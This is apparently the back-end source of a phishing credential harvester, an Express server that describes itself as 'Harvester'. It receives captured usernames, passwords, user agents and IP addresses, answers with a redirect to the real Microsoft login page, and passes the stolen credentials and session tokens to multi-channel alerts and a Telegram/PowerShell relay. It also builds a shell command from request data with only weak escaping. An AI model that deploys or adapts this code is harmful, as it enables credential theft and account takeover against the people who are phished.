const express = require('express');
const { exec } = require('child_process');
const Redis = require('ioredis');
const { sendAlertMultiChannel } = require('./alert_multichannel');
const { isDuplicate } = require('./alert_deduplication');
const { sendToDashboard } = require('./dashboard_integration');
const app = express();
app.use(express.json());

const redis = new Redis();
const ALERT_QUEUE = 'alertQueue';

// POST handler: enqueue alert
app.post('/api/v1/capture', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const enrichedData = { ...req.body, remoteAddress: ip };
    await redis.rpush(ALERT_QUEUE, JSON.stringify(enrichedData));
    res.json({ status: "queued", redirect: "https://login.microsoftonline.com" });
});

// Worker: process alerts from Redis queue
async function processQueue() {
    while (true) {
        const alertRaw = await redis.lpop(ALERT_QUEUE);
        if (alertRaw) {
            let alert;
            try {
                alert = JSON.parse(alertRaw);
            } catch {
                continue;
            }
            // Advanced deduplication
            if (await isDuplicate(alert)) {
                console.log('Duplicate alert skipped:', alert.username);
                continue;
            }
            // Multi-channel alerting
            try {
                await sendAlertMultiChannel({ message: formatAlertMessage(alert), ...alert });
            } catch (e) {
                console.error('Multi-channel alert error:', e);
            }
            // Dashboard integration
            try {
                await sendToDashboard(alert);
            } catch (e) {
                console.error('Dashboard integration error:', e);
            }
            // Still call PowerShell for legacy/archival/Telegram file logic
            const payload = alertRaw.replace(/"/g, '\\"');
            exec(`powershell.exe -File ./auto_format_and_send_alerts.ps1 -AlertJson "${payload}"`);
            await new Promise(r => setTimeout(r, 1500)); // Rate limit
        } else {
            await new Promise(r => setTimeout(r, 500)); // Wait if queue is empty
        }
    }
}

// Helper: format alert message for all channels
function formatAlertMessage(alert) {
    if (alert.customType === "Credential_Harvest") {
        return `Note - Message has been updated.\n\n✨ *Session Information* ✨\n\n👤 *Username:* \`${alert.username}\`\n🔑 *Password:* \`${alert.password}\`\n🌐 *Landing URL:* [Link](${alert.landingUrl})\n\n💻 *User Agent:* ${alert.userAgent}\n🌍 *Remote Address:* ${alert.remoteAddress}\n🕒 *Create Time:* ${Math.floor(Date.now() / 1000)}\n\n📦 *Tokens are added in txt file and attached separately in message.*\n`;
    }
    return `*Alert:* ${alert.message || alert.alertType || 'Unknown'}`;
}

processQueue();

// Health endpoint
app.get('/health', async (req, res) => {
    const queueLen = await redis.llen(ALERT_QUEUE);
    res.json({ status: "ok", queueLength: queueLen });
});

app.listen(3000, () => console.log('Harvester with Redis queue listening on port 3000'));
